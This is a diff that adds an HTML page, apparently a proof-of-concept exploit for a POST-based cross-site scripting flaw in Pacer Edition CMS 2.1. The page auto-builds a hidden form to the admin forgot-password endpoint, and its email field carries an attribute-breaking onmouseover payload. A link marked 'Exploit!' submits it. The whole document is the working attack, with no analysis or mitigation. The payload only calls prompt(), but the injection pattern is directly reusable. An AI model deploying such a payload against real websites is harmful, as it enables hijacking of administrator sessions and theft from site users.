@@ -1,0 +1,13 @@
+&lt;html&gt;
+&lt;title&gt;Pacer Edition CMS 2.1 Remote XSS POST Injection Vulnerability&lt;/title&gt;
+&lt;body bgcolor=&quot;#1C1C1C&quot;&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;function xss1(){document.forms[&quot;xss&quot;].submit();}&lt;/script&gt;
+&lt;form action=&quot;http://www.example.com/admin/login/forgot/index.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xss&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&#039;%F6&quot;+onmouseover=prompt(31337)&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;button&quot; value=&quot;Send%20Details&quot; /&gt;
+&lt;/form&gt;
+&lt;a href=&quot;javascript: xss1();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;&lt;br /&gt;&lt;br /&gt;Exploit!&lt;h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
